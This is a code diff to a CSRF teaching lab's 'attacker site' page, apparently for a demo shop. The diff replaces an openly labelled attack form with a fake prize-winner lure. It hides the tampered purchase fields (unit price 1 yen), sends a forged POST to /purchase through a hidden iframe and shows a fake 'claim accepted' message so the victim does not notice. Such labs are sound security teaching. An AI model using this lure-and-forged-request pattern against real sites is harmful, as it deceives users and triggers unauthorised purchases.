@@ -14,33 +14,36 @@
     </style>
   </head>
   <body>
-    <h1>Attacker Site（CSRF体験）</h1>
-    <div class="card">
-      <p class="muted">
-        これは学習用の「攻撃者サイト」です。Shopにログインした状態でこのページを開くと、CSRFで購入が実行されます。
-      </p>
-      <p class="muted">
-        ターゲット: <code id="targetBase"></code>
-      </p>
+    <div style="text-align: center; margin-top: 50px;">
+      <h1 style="color: #e44d26;">✨ おめでとうございます！ ✨</h1>
+      <div class="card" style="display: inline-block; max-width: 500px; border: 2px solid #e44d26; background-color: #fff9f8; padding: 20px; border-radius: 12px;">
+        <h2>🎊 豪華景品が当選しました 🎊</h2>
+        <p>あなたは本日、1,000,000人目の訪問者として選ばれました！</p>
+        <p>以下のボタンをクリックして、今すぐ景品（最新スマートフォン等）を受け取ってください。</p>
 
-      <label>product_id</label>
-      <input id="productId" value="1" />
+        <button id="attackBtn" type="button" style="background-color: #e44d26; color: white; border: none; padding: 15px 30px; font-size: 20px; font-weight: bold; cursor: pointer; border-radius: 8px;">
+          🎁 景品を受け取る
+        </button>
 
-      <label>quantity</label>
-      <input id="quantity" value="1" />
+        <p style="font-size: 12px; color: #999; margin-top: 20px;">
+          ※受け取り期限：本日中<br>
+          ※このキャンペーンは広告主によって提供されています。
+        </p>
+      </div>
 
-      <label>unit_price_yen（改ざん例）</label>
-      <input id="unitPrice" value="1" />
-
-      <label>total_yen（改ざん例・任意で上書き）</label>
-      <input id="total" value="" placeholder="空なら自動計算" />
-
-      <label>note</label>
-      <input id="note" value="CSRF_purchase" />
-
-      <button id="attackBtn" type="button">CSRFを実行（POST）</button>
-      <div class="muted">
-        フォーム送信で <code>/purchase</code> に POST します（トークンなし、Cookieだけで実行）。
+      <div style="margin-top: 100px; padding: 20px; background: #f9f9f9; font-size: 14px; color: #666; text-align: left; border-top: 1px solid #ddd;">
+        <p><strong>【学習用デバッグ表示】</strong></p>
+        <p>ターゲット: <code id="targetBase"></code></p>
+        <p>
+          このページはCSRF体験用の罠サイトを模したものです。ボタンをクリックすると、裏側でShopサイト（ターゲット）に対して購入リクエストが送信されます。
+        </p>
+        <div style="display: none;">
+          <input id="productId" value="1" />
+          <input id="quantity" value="1" />
+          <input id="unitPrice" value="1" />
+          <input id="total" value="" />
+          <input id="note" value="CSRF_attack_gift" />
+        </div>
       </div>
     </div>
 
@@ -67,9 +70,22 @@
 
       function submitPost() {
         const payload = buildPayload();
+
+        // ページ遷移（リダイレクト）を防ぐために、隠し iframe を作成してそこへ送信する
+        const iframeName = "csrf-frame";
+        let iframe = document.getElementsByName(iframeName)[0];
+        if (!iframe) {
+          iframe = document.createElement("iframe");
+          iframe.name = iframeName;
+          iframe.style.display = "none";
+          document.body.appendChild(iframe);
+        }
+
         const form = document.createElement("form");
         form.method = "POST";
         form.action = new URL("/purchase", TARGET_BASE).toString();
+        form.target = iframeName; // 送信先を iframe に指定
+
         Object.entries(payload).forEach(([k, v]) => {
           const input = document.createElement("input");
           input.type = "hidden";
@@ -79,6 +95,12 @@
         });
         document.body.appendChild(form);
         form.submit();
+
+        // 攻撃が完了したように見せかける（ユーザーには攻撃だと悟らせない）
+        document.getElementById("attackBtn").textContent = "✅ 申請済み";
+        document.getElementById("attackBtn").disabled = true;
+        document.getElementById("attackBtn").style.backgroundColor = "#ccc";
+        alert("景品の受け取り申請を受け付けました。発送までしばらくお待ちください。");
       }
 
       document.getElementById("attackBtn").addEventListener("click", () => {
